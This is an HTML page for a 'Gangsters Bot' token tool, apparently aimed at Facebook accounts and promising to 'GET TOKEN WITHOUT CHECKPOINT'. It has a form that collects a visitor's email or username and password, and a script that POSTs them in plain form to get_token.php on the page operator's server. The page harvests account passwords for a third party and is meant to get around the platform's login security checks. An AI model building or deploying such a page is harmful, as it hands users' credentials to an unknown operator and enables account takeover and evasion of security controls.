<!DOCTYPE html>
<html lang="en">
<head>
    <title>MUJAHID - Iphone Token</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/images/emoji.php/v9/z20/1/16/1f61c.png" type="images/x-icon"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Joti+One" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>
<div class="container">
<center><h2><font style="font-family: 'Joti One', cursive;font-size: 50px;">Gangsters Bot</h2></font></center>
<div class="panel-group">
<div class="panel panel-primary">
<div class="panel-heading"><center>GET TOKEN WITHOUT CHECKPOINT</center></div>
<div class="panel-body">      
<div class="form-group">
    <label for="usr">Email or Username:</label>
    <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
    <label for="pwd">Password:</label>
    <input type="password" class="form-control" id="mk">
</div>
    <center><button type="button" class="btn btn-primary" onclick="Puaru_Active()" >Get Token</button></center>
<p>
    <li id="trave" class="list-group-item"><center><b>NOTE : </b>Token will appear here after clicking [Get Token] button</center></li></p>
</div>
</div>
</div>
<center>POWERED BY MUJAHID</center>
<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "get_token.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

</body>
</html>